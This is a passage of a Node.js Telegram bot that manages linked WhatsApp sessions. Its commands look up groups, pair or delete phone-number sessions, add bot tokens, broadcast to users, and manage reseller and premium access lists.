                `📦 <b>Total Groups:</b> ${totalGroups}\n\n` +
                text;

            if (text.length > 4000) {
                const filePath = './Love/listgc.txt';
                fs.writeFileSync(filePath, text.replace(/<[^>]*>/g, ''));
                return S7.sendDocument(chatId, filePath);
            }

            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });

        SYLoVe('groupid', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const link = args[1];

            if (!isUserVerified(userId)) {
                return S7.sendMessage(chatId, `${deco.error} ${styleText('Please verify first! Use /start', 'fancy')}`);
            }

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (!link || !link.includes('chat.whatsapp.com/')) {
                return S7.sendMessage(chatId, `❌ Usage: /groupid [Group Link]\nExample: /groupid https://chat.whatsapp.com/Kzj...`);
            }

            try {
                const code = link.split('chat.whatsapp.com/')[1].trim();
                await S7.sendMessage(chatId, '🔍 <b>Scanning Link...</b>', { parse_mode: 'HTML' });
                const groupInfo = await client.groupGetInviteInfo(code);
                const text = 
                    `🆔 <b>GROUP ID FOUND</b>\n` +
                    `────────────────────\n` +
                    `📌 <b>Name:</b> ${groupInfo.subject}\n` +
                    `🔑 <b>ID:</b> <code>${groupInfo.id}</code>\n` +
                    `👑 <b>Owner:</b> <code>${groupInfo.owner || 'Unknown'}</code>\n` +
                    `👥 <b>Size:</b> ${groupInfo.size || 'Unknown'}\n` +
                    `────────────────────\n` +
                    `<i>Click the ID to copy</i>`;
                await S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
            } catch (err) {
                log('error', 'groupid', err.message);
                S7.sendMessage(chatId, `❌ <b>Invalid or Revoked Link</b>\nError: ${err.message}`, { parse_mode: 'HTML' });
            }
        });

        // ==================== EXISTING MISC COMMANDS ====================

        SYLoVe('addtoken', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const newToken = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!newToken) return S7.sendMessage(chatId, 'Usage: /addtoken <token>');
            let db = getDB();
            if (db.tokens.find(t => t.token === newToken)) return S7.sendMessage(chatId, '❌ Token already connected.');
            const myBotsCount = db.tokens.filter(t => t.owner === userId).length;
            if (myBotsCount >= 5) return S7.sendMessage(chatId, '🚫 Bot limit reached!\n\nYou can only add <b>5 bots maximum</b>.', { parse_mode: 'HTML' });
            try {
                const tempBot = new SY(newToken, { polling: false });
                const botInfo = await tempBot.getMe();
                db.tokens.push({ token: newToken, owner: userId });
                saveDB(db);
                startSYloveBot(newToken);
                S7.sendMessage(chatId, `✅ Token Connected\nBot: ${botInfo.first_name}\n@${botInfo.username}`);
            } catch (e) {
                S7.sendMessage(chatId, '❌ Invalid token.');
            }
        });

        SYLoVe('reqpair', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!number) return S7.sendMessage(chatId, '❌ Provide a phone number.\nExample: /reqpair +921131313313');
            const cleanNumber = number.replace(/[^0-9]/g, '');
            await StartLovingSY(chatId, cleanNumber, S7);
        });

        SYLoVe('delpair', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!number) return S7.sendMessage(chatId, '❌ Provide a phone number.\nExample: /delpair +921131313313');
            const cleanNumber = number.replace(/[^0-9]/g, '');
            const SYPaTH = `./Love/auth/${chatId}/${cleanNumber}`;
            if (fs.existsSync(SYPaTH)) {
                try {
                    fs.rmSync(SYPaTH, { recursive: true, force: true });
                    S7.sendMessage(chatId, `🗑️ Session deleted successfully for <b>${cleanNumber}</b>.`, { parse_mode: 'HTML' });
                } catch (err) {
                    S7.sendMessage(chatId, `❌ Failed to delete session: ${err.message}`);
                }
            } else {
                S7.sendMessage(chatId, `⚠️ No session found for <b>${cleanNumber}</b>.`, { parse_mode: 'HTML' });
            }
        });

        SYLoVe('deltoken', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const delToken = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!delToken) return S7.sendMessage(chatId, 'Usage: /deltoken <token>');
            let db = getDB();
            const tokenObj = db.tokens.find(t => t.token === delToken);
            if (!tokenObj || tokenObj.owner !== userId) return S7.sendMessage(chatId, '❌ No connected token found.');
            db.tokens = db.tokens.filter(t => t.token !== delToken);
            saveDB(db);
            if (activeBots[delToken]) {
                await activeBots[delToken].stopPolling();
                delete activeBots[delToken];
            }
            log('info', `Token deleted: ${delToken.substring(0, 10)}...`);
            S7.sendMessage(chatId, '✅ Token deleted successfully.');
        });

        SYLoVe('mytoken', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();
            let db = getDB();
            const myTokens = db.tokens.filter(t => t.owner === userId);
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (myTokens.length === 0) return S7.sendMessage(chatId, '❌ You have not added any tokens.');
            let text = '<b>Your Connected Bots</b>\n────────────────────\n\n';
            let count = 1;
            for (const item of myTokens) {
                try {
                    const bot = new SY(item.token, { polling: false });
                    const info = await bot.getMe();
                    text += `<b>${count}. ${info.first_name}</b>\n👤 Username: <b>@${info.username}</b>\n🔑 Token:\n<code>${item.token}</code>\n────────────────────\n\n`;
                } catch {
                    text += `<b>${count}. ⚠️ Unknown Bot</b>\n🔑 Token:\n<code>${item.token}</code>\n────────────────────\n\n`;
                }
                count++;
            }
            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });

        SYLoVe('addresell', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /addresell ID');
            let db = getDB();
            if (db.resellers.includes(targetId)) return S7.sendMessage(chatId, 'User is already a Reseller.');
            db.resellers.push(targetId);
            saveDB(db);
            S7.sendMessage(chatId, `✅ ID ${targetId} added as Reseller.`);
        });

        SYLoVe('delresell', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /delresell ID');
            let db = getDB();
            if (!db.resellers.includes(targetId)) return S7.sendMessage(chatId, 'User is not a Reseller.');
            db.resellers = db.resellers.filter(id => id !== targetId);
            saveDB(db);
            S7.sendMessage(chatId, `✅ ID ${targetId} removed from Resellers.`);
        });

        SYLoVe('listresell', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
            let db = getDB();
            if (db.resellers.length === 0) return S7.sendMessage(chatId, 'No resellers found.');
            let text = 'Reseller List:\n\n';
            for (let i = 0; i < db.resellers.length; i++) {
                const id = db.resellers[i].toString();
                try {
                    const user = await S7.getChat(id);
                    const username = user.username ? `@${user.username} : ` : '';
                    text += `${i + 1}. ${username}<code>${id}</code>\n`;
                } catch {
                    text += `${i + 1}. \`${id}\`\n`;
                }
            }
            text += '\n──────────────────';
            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });

        SYLoVe('broadcast', async (msg) => {
            const chatId = msg.chat.id.toString();
            if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile)) return S7.sendMessage(chatId, '❌ No user database found. Wait for users to /start the bot.');
            const users = JSON.parse(fs.readFileSync(userFile));
            if (users.length === 0) return S7.sendMessage(chatId, '❌ No users found in database.');
            const args = msg.text.split(' ').slice(1).join(' ');
            const replyMsg = msg.reply_to_message;
            if (!args && !replyMsg) {
                return S7.sendMessage(chatId, '<b>Usage:</b>\n1. <code>/broadcast Your Message</code>\n2. Reply to an image/video with <code>/broadcast</code>', { parse_mode: 'HTML' });
            }
            const statusMsg = await S7.sendMessage(chatId, `📣 <b>Starting Broadcast...</b>\n\n👥 Target Users: ${users.length}`, { parse_mode: 'HTML' });
            let success = 0, failed = 0;
            for (const user of users) {
                try {
                    if (replyMsg) await S7.copyMessage(user.id, chatId, replyMsg.message_id);
                    else await S7.sendMessage(user.id, args, { parse_mode: 'HTML' });
                    success++;
                } catch { failed++; }
                await new Promise(resolve => setTimeout(resolve, 50));
            }
            await S7.editMessageText(`✅ <b>Broadcast Completed</b>\n\n👥 Total Users: <code>${users.length}</code>\n📨 Success: <code>${success}</code>\n🚫 Failed/Blocked: <code>${failed}</code>`, {
                chat_id: chatId,
                message_id: statusMsg.message_id,
                parse_mode: 'HTML'
            });
        });

        // ==================== ADD/DEL PREMIUM WITH NOTIFICATION ====================

        SYLoVe('addprem', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            let db = getDB();
            const isOwner = chatId === config.adminId;
            const isReseller = db.resellers.includes(chatId);
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!isOwner && !isReseller) return S7.sendMessage(chatId, unauthorized);
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /addprem ID');
            if (db.premium.includes(targetId)) return S7.sendMessage(chatId, 'User is already Premium.');
            db.premium.push(targetId);
            saveDB(db);
            
            // Notify user
            await notifyPremiumAdded(S7, targetId, userId);
            
            S7.sendMessage(chatId, `⭐ ID ${targetId} added to Premium.`);
        });

        SYLoVe('delprem', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            let db = getDB();
            const isOwner = chatId === config.adminId;
            const isReseller = db.resellers.includes(chatId);
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!isOwner && !isReseller) return S7.sendMessage(chatId, unauthorized);
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /delprem ID');
            if (!db.premium.includes(targetId)) return S7.sendMessage(chatId, 'User is not Premium.');
            db.premium = db.premium.filter(id => id !== targetId);
            saveDB(db);
            
            // Notify user
            await notifyPremiumRemoved(S7, targetId, userId);
            
            S7.sendMessage(chatId, `🗑️ ID ${targetId} removed from Premium.`);
        });

        SYLoVe('listprem', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
            let db = getDB();
            if (db.premium.length === 0) return S7.sendMessage(chatId, 'No premium users found.');
            let text = 'Premium List:\n\n';
            for (let i = 0; i < db.premium.length; i++) {
                const id = db.premium[i].toString();
                try {
                    const user = await S7.getChat(id);
                    const username = user.username ? `@${user.username} : ` : '';
                    text += `${i + 1}. ${username}<code>${id}</code>\n`;
                } catch {
                    text += `${i + 1}. \`${id}\`\n`;
                }
            }
            text += '\n──────────────────';
            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });

        SYLoVe('state', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const value = args[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
            if (value !== '0' && value !== '1') return S7.sendMessage(chatId, 'Usage: /state 0 | 1');
            let db = getDB();
            db.state = Number(value);
            saveDB(db);
            S7.sendMessage(chatId, value === '0' ? '✅ State set to FREE MODE (All users allowed)' : '🔒 State set to PREMIUM ONLY MODE');
        });

        SYLoVe('listuser', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (msg.chat.id.toString() !== config.adminId) return S7.sendMessage(msg.chat.id, unauthorized);
            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile)) return S7.sendMessage(msg.chat.id, 'No users found.');
            const users = JSON.parse(fs.readFileSync(userFile));
            let list = 'User List:\n\n';
            users.forEach((u, i) => { list += `${i + 1}. ${u.name} (${u.id})\n`; });
            if (list.length > 4000) {
                const listPath = path.join(LoveDir, 'list.txt');
                fs.writeFileSync(listPath, list);
                S7.sendDocument(msg.chat.id, listPath);
            } else {
                S7.sendMessage(msg.chat.id, list);
            }
        });

    } catch (err) {
        log('error', 'STARTUP', `Could not start bot with token: ${token.substring(0, 10)}...`);
    }
}

// Start Bot
startSYloveBot(config.mainToken);

// Start Extra Bots
const db = getDB();
if (db.tokens && db.tokens.length > 0) {
    db.tokens.forEach(obj => startSYloveBot(obj.token));
} else {
    log('info', null, 'No extra bots found in database.');
}
